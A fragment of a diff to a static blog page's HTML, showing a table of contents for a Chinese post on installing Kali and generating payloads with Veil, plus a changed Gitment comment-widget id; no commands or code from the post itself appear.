+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#kali安装"><span class="nav-number">1.</span> <span class="nav-text">kali安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用说明"><span class="nav-number">2.</span> <span class="nav-text">使用说明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#工具使用"><span class="nav-number">3.</span> <span class="nav-text">工具使用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#启动veil"><span class="nav-number">3.1.</span> <span class="nav-text">启动veil</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#选择go语言stager"><span class="nav-number">3.2.</span> <span class="nav-text">选择go语言stager</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#生成payload"><span class="nav-number">3.3.</span> <span class="nav-text">生成payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#测试"><span class="nav-number">3.4.</span> <span class="nav-text">测试</span></a></li></ol></li></ol></div>
         
       </div>
       <!--/noindex-->
@@ -893,7 +873,7 @@ if (document.querySelectorAll('div.pdf').length) {
       repo: 'gitment-comments',
       owner: 'alpha302',
       admin: ['alpha302'],
-      id: '640ea28e49405244b0601badab838bba',
+      id: '3238e11f25f0ee1a5da3d7e5c9deb2ec',
         language: 'zh-CN',
       
       distractionFreeMode: 'true'
